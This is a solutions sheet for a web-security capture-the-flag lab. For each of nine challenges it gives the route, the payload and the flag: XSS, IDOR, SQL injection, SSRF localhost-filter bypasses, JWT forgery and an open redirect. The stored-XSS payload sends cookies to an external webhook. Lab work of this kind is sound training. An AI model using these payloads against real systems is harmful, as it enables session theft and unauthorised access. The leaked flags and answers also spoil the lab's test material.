
# CTF Solutions & Payloads

## 1. Reflected XSS
**Route:** `/challenges/xss-reflected?q=...`
**Payload:**
```
?q=<img src=x onerror=alert(1)>
```
**Flag:** Inspect the hidden div in the source code. `CTF{reflected_xss_is_still_a_thing}`.

## 2. Stored XSS
**Route:** `/challenges/xss-stored`
**Payload (in comment):**
```html
<img src=x onerror="fetch('https://webhook.site/...?cookie='+document.cookie)">
```
**Flag:** Located in cookies. `CTF{stored_xss_steal_my_cookie}`.

## 3. DOM XSS
**Route:** `/challenges/xss-dom`
**Payload:**
Append hash: `#<img src=x onerror=alert(1)>`
**Flag:** Hidden in a `<div>` that becomes visible via JS or by inspecting source. `CTF{dom_xss_is_client_side_fun}`.

## 4. IDOR
**Route:** `/challenges/idor`
**Exploit:**
Change the ID input to `1`.
Or fetch: `curl http://localhost:3000/api/users/1`
**Flag:** User 1 secret_data. `CTF{IDOR_FLAG_FOUND}`.

## 5. SQL Injection
**Route:** `/challenges/sqli`
**Payload (Username):**
`admin' OR '1'='1`
**Flag:** Returned in JSON response. `CTF{tables_gone_wild_sql_injection}`.

## 6. SSRF
**Route:** `/challenges/ssrf`
**Goal:** Access `http://localhost:3000/api/internal/secret`.
**Constraint:** `localhost` and `127.0.0.1` are blocked.
**Payloads:**
- `http://[::1]:3000/api/internal/secret` (IPv6)
- `http://0.0.0.0:3000/api/internal/secret`
- `http://2130706433:3000/api/internal/secret` (Decimal IP for 127.0.0.1)
**Flag:** `CTF{ssrf_filtering_bypassed_successfully}`.

## 7. JWT Bypass
**Route:** `/challenges/jwt`
**Exploit:**
Take the Guest Token.
Option 1: Sign it with HS256 and secret `secret123` changing `role` to `admin`.
Option 2: Change alg to `none`, remove signature.
**Flag:** `CTF{jwt_none_algorithm_bypass_success}`.

## 8. Open Redirect
**Route:** `/api/redirect?url=http://evil.com`
**Flag:** `CTF{always_validate_redirect_destinations}`.

## 9. Exposed Secrets
Check `http://localhost:3000/secrets.txt` (if created) or View Source on `/challenges/idor`.
API Key for admin is leaked in the IDOR response.
